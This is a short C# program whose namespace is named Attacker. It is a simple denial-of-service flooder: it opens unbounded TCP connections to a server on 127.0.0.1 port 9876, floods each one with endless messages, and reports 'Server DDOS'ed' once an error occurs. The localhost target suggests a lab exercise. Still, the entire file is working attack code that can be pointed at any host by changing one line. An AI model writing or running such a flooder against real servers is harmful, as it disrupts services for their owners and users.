using System;
using System.Net;
using System.Net.Sockets;
using System.Security.AccessControl;
using System.Text;

namespace Attacker
{
    public class Program
    {
        static void DDOS()
        {
            
        }   
        
        
        static void Main(string[] args)
        {
            try
            {
                string serverIpAddress = "127.0.0.1";
                int serverPort = 9876;
                var clients = new List<TcpClient>();

                while (true)
                {
                    var client = new TcpClient(serverIpAddress, serverPort);
                    clients.Add(client);
                    Console.WriteLine(client.Client.LocalEndPoint);


                    Task.Run((() =>
                    {
                        while (true)
                        {
                            var message = "HELLO FROM ATTACKER";
                            Byte[] data = System.Text.Encoding.ASCII.GetBytes(message);
                            NetworkStream stream = client.GetStream();
                            stream.Write(data, 0, data.Length);
                        }
                    }));
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"Error: {e.Message}");
                Console.WriteLine($"Server DDOS'ed");

                // while (true)
                // {
                // }
            }
        }
    }
}